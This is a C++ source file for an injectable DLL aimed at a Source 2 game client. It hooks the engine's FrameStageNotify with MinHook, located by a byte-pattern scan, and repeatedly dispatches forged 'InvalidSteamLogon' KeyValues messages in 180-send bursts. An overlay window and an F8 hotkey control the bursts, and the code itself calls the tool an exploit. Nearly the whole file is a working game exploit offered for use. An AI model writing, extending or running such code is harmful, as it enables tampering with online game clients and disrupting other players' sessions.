#include <windows.h>
#include <cstdio>
#include <cstring>
#include <cstdint>

#include "../../dependencies/minhook/minhook.h"

#include "invalid_steam_logon.h"

namespace invalid_steam_logon {

static volatile LONG g_started = 0;



using create_interface_fn  = void* (__cdecl*)( const char* name, int* return_code );
using kv_new_fn            = void* (__cdecl*)( size_t size );
using kv_ctor_fn           = void* (__cdecl*)( void* self, const char* name, void* kv_system, bool owns_memory );
using kv_set_int_fn        = void  (__cdecl*)( void* self, const char* key, int value );
using kv_dtor_fn           = void  (__cdecl*)( void* self );
using engine_dispatch_fn   = void  (__cdecl*)( void* engine_iface, void* kv );
using frame_stage_notify_fn = void (__cdecl*)();



static uintptr_t             g_client_base      = 0;
static kv_new_fn             g_kv_new           = nullptr;
static kv_ctor_fn            g_kv_ctor          = nullptr;
static kv_set_int_fn         g_kv_set_int       = nullptr;
static kv_dtor_fn            g_kv_dtor          = nullptr;
static engine_dispatch_fn    g_engine_dispatch   = nullptr;
static void*                 g_engine_iface     = nullptr;
static frame_stage_notify_fn g_original_fsn     = nullptr;

static volatile bool         g_exploit_enabled  = false;
static volatile bool         g_dragging         = false;
static volatile LONG         g_burst_remaining  = 0;
static volatile LONG         g_total_dispatched = 0;

static HWND                  g_overlay_hwnd     = nullptr;
static HWND                  g_parent_hwnd      = nullptr;
static HFONT                 g_font_bold        = nullptr;
static HFONT                 g_font_normal      = nullptr;
static int                   g_drag_offset_x    = 0;
static int                   g_drag_offset_y    = 0;

static int                   g_window_width     = 320;
static int                   g_window_height    = 108;
static RECT                  g_toggle_rect      = { 18, 34, 302, 56 };
static RECT                  g_burst_rect       = { 18, 66, 302, 84 };



static uintptr_t pattern_scan( uintptr_t module_base, const char* pattern )
{
    if ( !module_base || !pattern )
        return 0;

    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>( module_base );
    if ( dos->e_magic != IMAGE_DOS_SIGNATURE )
        return 0;

    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>( module_base + dos->e_lfanew );
    if ( nt->Signature != IMAGE_NT_SIGNATURE )
        return 0;

    uint8_t bytes[256];
    uint8_t mask[256];
    int     count = 0;

    const char* p = pattern;
    while ( *p && count < 256 )
    {
        if ( *p == ' ' )
        {
            ++p;
            continue;
        }

        if ( *p == '?' )
        {
            mask[count]  = 0;
            bytes[count] = 0;
            ++count;
            if ( p[1] == '?' )
                ++p;
            ++p;
            continue;
        }

        auto hex_char = []( char c ) -> int
        {
            if ( c >= '0' && c <= '9' ) return c - '0';
            if ( c >= 'a' && c <= 'f' ) return c - 'a' + 10;
            if ( c >= 'A' && c <= 'F' ) return c - 'A' + 10;
            return -1;
        };

        int hi = hex_char( *p );
        int lo = hex_char( p[1] );
        if ( hi == -1 || lo == -1 )
        {
            ++p;
            continue;
        }

        mask[count]  = 0xFF;
        bytes[count] = static_cast<uint8_t>( ( hi << 4 ) | lo );
        ++count;
        p += 2;
    }

    if ( count == 0 )
        return 0;

    auto sections = IMAGE_FIRST_SECTION( nt );
    for ( WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i )
    {
        if ( !( sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
            continue;

        auto section_base = module_base + sections[i].VirtualAddress;
        auto section_size = sections[i].SizeOfRawData;

        if ( section_size < static_cast<DWORD>( count ) )
            continue;

        for ( DWORD offset = 0; offset <= section_size - count; ++offset )
        {
            bool found = true;
            for ( int j = 0; j < count; ++j )
            {
                if ( mask[j] && *reinterpret_cast<uint8_t*>( section_base + offset + j ) != bytes[j] )
                {
                    found = false;
                    break;
                }
            }
            if ( found )
                return section_base + offset;
        }
    }

    return 0;
}


static void log( const char* fmt, ... )
{
    va_list args;
    va_start( args, fmt );
    vprintf( fmt, args );
    va_end( args );
}



static void fire_burst()
{
    g_exploit_enabled = true;
    g_burst_remaining = 180;
    g_total_dispatched = 0;
    log( "[*] BURST FIRED (180 sends)\n" );
    if ( g_overlay_hwnd )
        InvalidateRect( g_overlay_hwnd, nullptr, FALSE );
}



static void __cdecl hooked_frame_stage_notify()
{
    if ( g_original_fsn )
        g_original_fsn();

    if ( !g_exploit_enabled )
        return;

    if ( g_burst_remaining <= 0 )
        return;

    if ( !g_engine_iface || !g_engine_dispatch )
        return;

    if ( !g_kv_new || !g_kv_ctor || !g_kv_set_int || !g_kv_dtor )
        return;

    void* kv = g_kv_new( 28 );
    if ( !kv )
        return;

    g_kv_ctor( kv, "InvalidSteamLogon", nullptr, false );
    g_kv_set_int( kv, "reason", 13 );
    g_engine_dispatch( g_engine_iface, kv );
    InterlockedIncrement( &g_total_dispatched );
    g_kv_dtor( kv );

    InterlockedDecrement( &g_burst_remaining );
}



static void render_overlay( HDC hdc )
{
    RECT full = { 0, 0, g_window_width, g_window_height };
    HBRUSH bg = CreateSolidBrush( 0x141010 );
    FillRect( hdc, &full, bg );
    DeleteObject( bg );

    RECT title_bar = { 0, 0, g_window_width, 30 };
    HBRUSH title_bg = CreateSolidBrush( 0x241E1E );
    FillRect( hdc, &title_bar, title_bg );
    DeleteObject( title_bg );

    HPEN border_pen = CreatePen( PS_SOLID, 1, 0x5A5050 );
    HGDIOBJ old_pen = SelectObject( hdc, border_pen );
    HGDIOBJ old_brush = SelectObject( hdc, GetStockObject( HOLLOW_BRUSH ) );
    Rectangle( hdc, 0, 0, g_window_width, g_window_height );
    SelectObject( hdc, old_brush );
    SelectObject( hdc, old_pen );
    DeleteObject( border_pen );

    SetBkMode( hdc, TRANSPARENT );
    SetTextColor( hdc, 0xF0EBEB );
    HGDIOBJ old_font = SelectObject( hdc, g_font_bold );
    TextOutA( hdc, 10, 6, "InvalidSteamLogon", 17 );
    SelectObject( hdc, old_font );

    COLORREF toggle_color = g_exploit_enabled ? 0x00D2A800 : 0x004638AC;
    HBRUSH toggle_bg = CreateSolidBrush( toggle_color );
    FillRect( hdc, &g_toggle_rect, toggle_bg );
    DeleteObject( toggle_bg );

    SelectObject( hdc, g_font_normal );
    SetTextColor( hdc, 0xD2C8C8 );

    char status_str[96];
    snprintf( status_str, sizeof( status_str ), "Exploit: %s   (sent %ld)",
              g_exploit_enabled ? "ON" : "OFF", g_total_dispatched );
    TextOutA( hdc, 36, 45, status_str, static_cast<int>( strlen( status_str ) ) );

    HBRUSH burst_bg = CreateSolidBrush( 0x302828 );
    FillRect( hdc, &g_burst_rect, burst_bg );
    DeleteObject( burst_bg );

    SetTextColor( hdc, 0xE6DCDC );
    char burst_str[64];
    snprintf( burst_str, sizeof( burst_str ), "FIRE BURST (F8)  left=%ld", g_burst_remaining );
    TextOutA( hdc, 22, 67, burst_str, static_cast<int>( strlen( burst_str ) ) );

    SetTextColor( hdc, 0x827878 );
    TextOutA( hdc, 10, g_window_height - 22, "Drag title to move.  HOME to close.", 34 );
}



static LRESULT CALLBACK overlay_wndproc( HWND hwnd, UINT msg, WPARAM wp, LPARAM lp )
{
    int mx = static_cast<short>( LOWORD( lp ) );
    int my = static_cast<short>( HIWORD( lp ) );

    switch ( msg )
    {
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint( hwnd, &ps );
        render_overlay( hdc );
        EndPaint( hwnd, &ps );
        return 0;
    }

    case WM_NCHITTEST:
        return HTCLIENT;

    case WM_DESTROY:
        PostQuitMessage( 0 );
        return 0;

    case WM_KEYDOWN:
        if ( wp == VK_HOME )
            ShowWindow( hwnd, SW_HIDE );
        return 0;

    case WM_MOUSEMOVE:
        if ( g_dragging && ( wp & MK_LBUTTON ) )
        {
            POINT pt;
            GetCursorPos( &pt );
            SetWindowPos( hwnd, nullptr,
                          pt.x - g_drag_offset_x,
                          pt.y - g_drag_offset_y,
                          0, 0, SWP_NOSIZE | SWP_NOZORDER );
        }
        return 0;

    case WM_LBUTTONDOWN:
        if ( mx >= 0 && mx < g_window_width && my <= 29 )
        {
            g_dragging = true;
            SetCapture( hwnd );
            g_drag_offset_x = mx;
            g_drag_offset_y = my;
        }
        else if ( mx >= g_toggle_rect.left && mx <= g_toggle_rect.right &&
                  my >= g_toggle_rect.top  && my <= g_toggle_rect.bottom )
        {
            g_exploit_enabled = !g_exploit_enabled;
            if ( g_exploit_enabled )
            {
                g_burst_remaining = 180;
                g_total_dispatched = 0;
                log( "[*] EXPLOIT ON, burst armed %ld\n", 180 );
            }
            else
            {
                g_burst_remaining = 0;
                log( "[*] EXPLOIT OFF (dispatched %ld total)\n", g_total_dispatched );
            }
            if ( g_overlay_hwnd )
                InvalidateRect( g_overlay_hwnd, nullptr, FALSE );
        }
        else if ( mx >= g_burst_rect.left && mx <= g_burst_rect.right &&
                  my >= g_burst_rect.top  && my <= g_burst_rect.bottom )
        {
            fire_burst();
        }
        return 0;

    case WM_LBUTTONUP:
        if ( g_dragging )
        {
            g_dragging = false;
            ReleaseCapture();
        }
        return 0;

    default:
        return DefWindowProcA( hwnd, msg, wp, lp );
    }
}



static DWORD WINAPI overlay_thread( LPVOID )
{
    WNDCLASSEXA wc = {};
    wc.cbSize        = sizeof( wc );
    wc.lpfnWndProc   = overlay_wndproc;
    wc.hInstance      = GetModuleHandleA( nullptr );
    wc.lpszClassName  = "MiniExploitOverlay";
    wc.hCursor        = LoadCursorA( nullptr, IDC_ARROW );
    RegisterClassExA( &wc );

    g_parent_hwnd = FindWindowA( "SDL_app", nullptr );
    if ( !g_parent_hwnd )
        g_parent_hwnd = GetDesktopWindow();

    g_overlay_hwnd = CreateWindowExA(
        WS_EX_TOPMOST | WS_EX_LAYERED | WS_EX_TOOLWINDOW,
        wc.lpszClassName,
        "Mini Exploit",
        WS_POPUP,
        20, 40,
        g_window_width, g_window_height,
        g_parent_hwnd,
        nullptr,
        wc.hInstance,
        nullptr );

    SetLayeredWindowAttributes( g_overlay_hwnd, 0x141010, 255, LWA_COLORKEY );

    g_font_bold   = CreateFontA( -15, 0, 0, 0, FW_BOLD,   0, 0, 0, 0, 0, 0, CLEARTYPE_QUALITY, 0, "Segoe UI" );
    g_font_normal = CreateFontA( -13, 0, 0, 0, FW_NORMAL, 0, 0, 0, 0, 0, 0, CLEARTYPE_QUALITY, 0, "Segoe UI" );

    g_burst_rect.right = g_window_width - 18;

    ShowWindow( g_overlay_hwnd, SW_SHOW );

    MSG msg;
    while ( GetMessageA( &msg, nullptr, 0, 0 ) )
    {
        TranslateMessage( &msg );
        DispatchMessageA( &msg );
    }

    return 0;
}



static DWORD WINAPI hotkey_thread( LPVOID )
{
    LONG prev_dispatched = 0;
    LONG prev_remaining  = 0;

    while ( true )
    {
        if ( ( GetAsyncKeyState( VK_F8 ) & 1 ) && g_burst_remaining <= 0 )
        {
            fire_burst();
        }

        if ( ( GetAsyncKeyState( VK_HOME ) & 1 ) && g_overlay_hwnd )
        {
            ShowWindow( g_overlay_hwnd, SW_SHOW );
        }

        if ( g_total_dispatched != prev_dispatched || g_burst_remaining != prev_remaining )
        {
            prev_dispatched = g_total_dispatched;
            prev_remaining  = g_burst_remaining;
            if ( g_overlay_hwnd )
                InvalidateRect( g_overlay_hwnd, nullptr, FALSE );
        }

        Sleep( 16 );
    }
}



static DWORD WINAPI cleanup_thread( LPVOID )
{
    Sleep( 2000 );
    MH_DisableHook( MH_ALL_HOOKS );
    MH_Uninitialize();
    return 0;
}



static DWORD WINAPI init_thread( LPVOID )
{
    g_client_base = reinterpret_cast<uintptr_t>( GetModuleHandleA( "client.dll" ) );
    if ( !g_client_base )
    {
        log( "[!] client.dll not loaded\n" );
        return 0;
    }

    HMODULE engine2 = GetModuleHandleA( "engine2.dll" );
    if ( engine2 )
    {
        auto ci = reinterpret_cast<create_interface_fn>( GetProcAddress( engine2, "CreateInterface" ) );
        if ( ci )
        {
            g_engine_iface = ci( "Source2EngineToClient001", nullptr );
            if ( g_engine_iface )
            {
                auto vtable = *reinterpret_cast<uintptr_t**>( g_engine_iface );
                g_engine_dispatch = reinterpret_cast<engine_dispatch_fn>( vtable[952 / 8] );
            }
        }
    }

    if ( !g_engine_iface )
    {
        log( "[!] no engine interface\n" );
    }

    HMODULE tier0 = GetModuleHandleA( "tier0.dll" );
    if ( tier0 )
    {
        g_kv_new     = reinterpret_cast<kv_new_fn>(     GetProcAddress( tier0, "??2KeyValues@@SAPEAX_K@Z" ) );
        g_kv_ctor    = reinterpret_cast<kv_ctor_fn>(    GetProcAddress( tier0, "??0KeyValues@@QEAA@PEBDPEAVIKeyValuesSystem@@_N@Z" ) );
        g_kv_set_int = reinterpret_cast<kv_set_int_fn>( GetProcAddress( tier0, "?SetInt@KeyValues@@QEAAXPEBDH@Z" ) );
        g_kv_dtor    = reinterpret_cast<kv_dtor_fn>(    GetProcAddress( tier0, "??1KeyValues@@QEAA@XZ" ) );

        if ( !g_kv_new )
            g_kv_new = reinterpret_cast<kv_new_fn>( GetProcAddress( tier0, "??2KeyValues@@SAPEAX_KHPEBDH@Z" ) );
        if ( !g_kv_set_int )
            g_kv_set_int = reinterpret_cast<kv_set_int_fn>( GetProcAddress( tier0, "?SetInt@KeyValues@@QAEXPEBDH@Z" ) );
        if ( !g_kv_dtor )
            g_kv_dtor = reinterpret_cast<kv_dtor_fn>( GetProcAddress( tier0, "??1KeyValues@@QAEXXZ" ) );

        if ( g_kv_new && g_kv_ctor && g_kv_set_int && g_kv_dtor )
        {
            log( "[+] engine=%p  dispatch=%p\n", g_engine_iface, g_engine_dispatch );
            log( "[+] KV new=%p ctor=%p setint=%p dtor=%p\n", g_kv_new, g_kv_ctor, g_kv_set_int, g_kv_dtor );
        }
        else
        {
            log( "[!] KV not resolved: new=%p ctor=%p set=%p dtor=%p\n", g_kv_new, g_kv_ctor, g_kv_set_int, g_kv_dtor );
        }
    }
    else
    {
        log( "[!] no tier0\n" );
    }

    auto fsn_addr = pattern_scan( g_client_base,
        "48 89 5C 24 ? 48 89 6C 24 ? 57 48 83 EC ? 48 8B F9 33 ED" );

    if ( MH_Initialize() != MH_OK )
    {
        log( "[!] MinHook init failed\n" );
        return 0;
    }

    if ( fsn_addr )
    {
        if ( MH_CreateHook( reinterpret_cast<void*>( fsn_addr ),
                            reinterpret_cast<void*>( &hooked_frame_stage_notify ),
                            reinterpret_cast<void**>( &g_original_fsn ) ) != MH_OK )
        {
            log( "[!] FSN hook failed\n" );
        }
        else
        {
            MH_EnableHook( reinterpret_cast<void*>( fsn_addr ) );
            log( "[+] FrameStageNotify hooked at %p\n", reinterpret_cast<void*>( fsn_addr ) );
        }
    }
    else
    {
        log( "[!] FSN pattern not found - exploit will not fire\n" );
    }

    log( "\n  ==========================================\n" );
    log( "  Invalid Steam Logon Exploit\n" );
    log( "  ==========================================\n" );
    log( "  Overlay menu: drag title, click checkbox\n" );
    log( "  F8 = fire burst (180 sends)\n" );
    log( "  ==========================================\n\n" );

    HANDLE h = CreateThread( nullptr, 0, overlay_thread, nullptr, 0, nullptr );
    if ( h ) CloseHandle( h );

    while ( true )
        Sleep( 10000 );
}



bool start()
{
    if (InterlockedCompareExchange(&g_started, 1, 0) != 0)
        return false;

    HANDLE hotkey = CreateThread(nullptr, 0, hotkey_thread, nullptr, 0, nullptr);
    if (hotkey) CloseHandle(hotkey);

    HANDLE init = CreateThread(nullptr, 0, init_thread, nullptr, 0, nullptr);
    if (init) CloseHandle(init);

    return hotkey != nullptr && init != nullptr;
}

} // namespace invalid_steam_logon

